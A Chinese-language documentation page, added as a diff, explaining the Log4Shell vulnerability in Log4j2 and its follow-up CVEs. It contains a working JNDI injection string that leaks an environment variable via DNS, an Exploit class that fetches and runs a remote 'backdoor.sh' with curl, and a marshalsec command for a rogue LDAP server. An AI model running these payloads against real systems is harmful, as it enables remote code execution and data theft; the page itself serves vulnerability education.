@@ -1,0 +1,117 @@
+---
+slug: /log4shell
+title: Log4shell（Log4j2 RCE）
+icon: flame-icon
+---
+
+Log4j2是一个广泛使用的Java日志框架，允许开发者通过简单的方式记录日志。该漏洞被标识为CVE-2021-44228，通常称为“Log4Shell”，通用漏洞评分系统 (CVSS) 评分为 10，其影响范围极广泛且能造成严重后果，是有史以来最危险的漏洞之一。
+
+Log4j2主要有两个模块`log4j-api`和`log4j-core`，`log4j-api`是公共接口模块，主要用来定义日志的格式。`log4j-core`是核心实现模块，提供具体的日志记录功能。`log4j-core`依赖`log4j-api`。Log4j 1.x在2015年停止了维护，提到的Log4j默认指2.x版本。
+
+漏洞产生的核心原因在于记录日志中提供了JNDI功能，如果日志内容中存在`JNDI LDAP`，Log4j会连接该服务器并下载恶意对象，通过反射机制来实例化该对象并调用其方法。
+
+```xml
+<dependencies>
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.14.0</version>
+    </dependency>
+</dependencies>
+```
+
+```java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+public class Main {
+    private static final Logger logger = LogManager.getLogger();
+    public static void main(String[] args) {
+         logger.error("${jndi:ldap://${env:USERNAME}.dns.feei.cn:8080/#Exploit}rce-test");
+    }
+}
+```
+
+除了正常用户请求参数可能被打印在日志中外，各种请求头（Request Header）也是最常被利用的触发点，同时各种外部请求经过数据库、消息队列等再次转存后被触发也非常常见。
+
+利用过程中除了LDAP协议，还可以使用RMI、DNS等协议。
+
+当前日志优先级大于等于系统设置级别时才有效（默认为.error），默认这里只能用.error或.fatal，不能使用.warn/.info/.debug/.trace。
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+ <Configuration status="WARN">
+   <Appenders>
+     <Console name="Console" target="SYSTEM_OUT">
+       <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
+     </Console>
+   </Appenders>
+   <Loggers>
+     <Root level="error">
+       <AppenderRef ref="Console"/>
+     </Root>
+   </Loggers>
+ </Configuration>
+```
+
+```python
+import org.apache.logging.log4j.core.config.Configurator;
+Configurator.setLevel("Class Name", Level.INFO);
+```
+
+使用`marshalsec`工具创建一个恶意的LDAP服务。也可以通过JNDI Exploiters、Apache Directory Server、OpenLDAP、Evil-WinRM，甚至通过Python使用ldap3库搭建恶意LDAP服务。
+
+```java
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.Reader;
+
+public class Exploit{
+    public Exploit() throws IOException,InterruptedException{
+        String cmd = "\"$(curl -fsSL https://feei.cn/backdoor.sh)\"";
+        final Process process = Runtime.getRuntime().exec(new String[] { "sh", "-c", cmd });
+        printMessage(process.getInputStream());
+        printMessage(process.getErrorStream());
+        int value = process.waitFor();
+        System.out.println(value);
+    }
+
+    private static void printMessage(final InputStream input) {
+        new Thread (new Runnable() {
+            @Override
+            public void run() {
+                Reader reader =new InputStreamReader(input);
+                BufferedReader bf = new BufferedReader(reader);
+                String line = null;
+                try {
+                    while ((line=bf.readLine())!=null)
+                    {
+                        System.out.println(line);
+                    }
+                }catch (IOException  e){
+                    e.printStackTrace();
+                }
+            }
+        }).start();
+    }
+}
+```
+
+```bash
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit
+```
+
+在发现 Log4Shell 漏洞后，Apache 开始着手对其进行修补，由于多次被绕过。最终，Apache 花了四个补丁才彻底修复了 Log4Shell 和所有相关漏洞。
+
+#### CVE-2021-45046
+
+Apache 发布的第一个补丁 Log4J 版本 2.15.0 修复了大部分 Log4Shell 漏洞。但是，黑客仍然可以向使用某些非默认设置的系统发送恶意 JNDI 查找。Apache 使用 Log4J 版本 2.16.0 解决了此漏洞。
+
+#### CVE-2021-45105
+
+2.16.0 版本也被证明是不完整的。黑客可以利用恶意消息查找使易受攻击的系统陷入无限递归，从而导致 拒绝服务攻击。Apache 发布了 2.17 版本来修复此漏洞。
+
+#### CVE-2021-44832
+
+这个漏洞的严重程度低于其他漏洞，它允许黑客远程执行代码，但他们需要先获得提升的权限并更改日志配置。Apache 发布了第四个补丁 Log4J 2.17.1 版来解决这个问题。
